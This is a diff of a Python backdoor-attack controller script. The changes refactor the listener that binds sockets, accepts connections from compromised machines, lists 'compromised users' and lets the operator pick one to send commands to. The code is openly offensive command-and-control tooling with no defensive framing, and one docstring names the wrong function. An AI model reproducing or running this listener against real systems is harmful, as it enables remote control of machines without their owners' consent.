@@ -30,8 +30,8 @@ def print_sample_usage_msg():
 """ 
 * Function Name:  get_dns_spoofer_args()
 * Input:          None
-* Output:         args.targets (set): The IP address(es) of the target(s).
-*                 args.ports (set): The port(s) for communication with the target system(s).
+* Output:         args.targets (list): The IP address(es) of the target(s).
+*                 args.ports (list): The port(s) for communication with the target system(s).
 * Logic:          The function parses the parameters passed to the script and verifies if all the required parameters are present.
 * Example Call:   targets, ports = get_backdoor_attack_args()
 """
@@ -42,7 +42,7 @@ def get_backdoor_attack_args():
     args = parser.parse_args()
 
     if(len(set(args.targets)) != len(set(args.ports))):
-        print("\nError: target and port mismatch!! Pass the correct target IPs and ports as an argument to the script.")
+        print("\nError: target / port missing!! Pass the correct target IPs and ports as an argument to the script.")
         print_sample_usage_msg()  
         return None, None
 
@@ -58,7 +58,7 @@ def get_backdoor_attack_args():
         print("\nError: Port number(s) missing!! Pass the missing port number(s) as an argument to the script.")
         print_sample_usage_msg()
 
-    return set(args.targets), set(args.ports)
+    return args.targets, args.ports
 
 
 class BackdoorAttack:
@@ -77,7 +77,7 @@ class BackdoorAttack:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((ip, port))
+        listener.bind(("", port))
         listener.listen(0)
 
         self.connection, self.address = listener.accept()
@@ -242,7 +242,7 @@ class BackdoorAttack:
 * Example Call:   create_listener("192.168.1.11", 2000)
 """
 def create_listener(ip, port):
-    listener.append(BackdoorAttack(ip, port))
+    obj_list.append(BackdoorAttack(ip, port))
 
 
 if __name__ == "__main__":
@@ -250,7 +250,7 @@ if __name__ == "__main__":
 
     if((targets != None) and (ports != None)):
         try:
-            listener = []
+            obj_list = []
             listen_thread = []
             for ip, port in zip(targets, ports):
                 listen_thread.append(Thread(target=create_listener, args=(ip, int(port), )))
@@ -273,7 +273,7 @@ if __name__ == "__main__":
 
                     if(option != "q"):
                         if(option in (str(i) for i in range(1, len(BackdoorAttack.compromised_users)+1))):
-                            listener[int(option)-1].communicate()
+                            obj_list[int(option)-1].communicate()
 
                             if(BackdoorAttack.compromised_sys_count == 0):
                                 print_waiting = 1
@@ -289,7 +289,7 @@ if __name__ == "__main__":
             if(option == "q"):
                 if(BackdoorAttack.compromised_sys_count > 0):
                     print("\n\nClosing all connections...")
-                    for obj in listener:
+                    for obj in obj_list:
                         obj.execute_on_sys(["quit"])
                     print("Stopping Backdoor Attack...\n")
 
@@ -299,7 +299,7 @@ if __name__ == "__main__":
         except KeyboardInterrupt: 
             if(BackdoorAttack.compromised_sys_count > 0):
                 print("\n\nClosing all connections...")
-                for obj in listener:
+                for obj in obj_list:
                     obj.execute_on_sys(["quit"])
                 print("Stopping Backdoor Attack...\n")
 
